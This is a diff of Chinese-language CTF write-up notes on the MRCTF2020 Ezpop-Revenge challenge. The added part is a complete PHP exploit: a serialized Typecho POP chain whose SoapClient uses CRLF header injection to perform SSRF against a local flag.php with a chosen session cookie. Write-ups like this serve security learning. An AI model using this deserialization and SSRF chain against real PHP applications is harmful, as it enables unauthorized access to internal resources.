@@ -72,7 +72,7 @@ Please input first
 
 ![](attachments/Pasted%20image%2020230415114824.png)
 
-## `[MRCTF2020]`Ezpop-Revenge
+## `[MRCTF2020]`Ezpop-Revenge #Soap  #SSRF #反序列化
 `www.zip`源码泄露
 
 flag.php
@@ -290,8 +290,57 @@ else {
 ```
 
 发现是`^^`被匹配到了这里将他换为`\r\n`
-在打的时候报502，看了其他师傅的wp也不存在所谓的%被过滤，base64解码后是没有这个问题的
 
+在用payload传参后只需要带着一样的phpsessid去访问就可以了
+![](attachments/Pasted%20image%2020230420141459.png)
+
+最终exp
+
+```php
+<?php  
+class Typecho_Db_Query  
+{  
+    private $_sqlPreBuild;  
+    private $_adapter;  
+  
+    public function __construct()  
+    {        $host = "http://127.0.0.1/flag.php";  
+        $header = array('Cookie: PHPSESSID=4mrff5ndm9o9irau6bq0na38n6',);  
+        $this->_sqlPreBuild['action'] = 'SELECT';  
+        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>str_replace('^^', "\r\n",'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header)),'uri'=> "wuwumonster"));  
+    }  
+}  
+  
+class Typecho_Db  
+{  
+    public function __construct($adapterName, $prefix = 'typecho_')  
+    {        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;  
+    }  
+}  
+class HelloWorld_DB  
+{  
+    private $coincidence;  
+    function __construct()  
+    {        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);  
+    }  
+    function  __wakeup(){  
+        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);  
+    }  
+}  
+  
+$ser = serialize(new HelloWorld_DB());  
+  
+print($ser);  
+$ser_b64 = base64_encode($ser);  
+print('  
+');  
+if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($ser_b64)) === 0){  
+    print($ser_b64);  
+}  
+else{  
+    print("matched");  
+}
+```
 
 ## `[RoarCTF 2019]`PHPShe
 
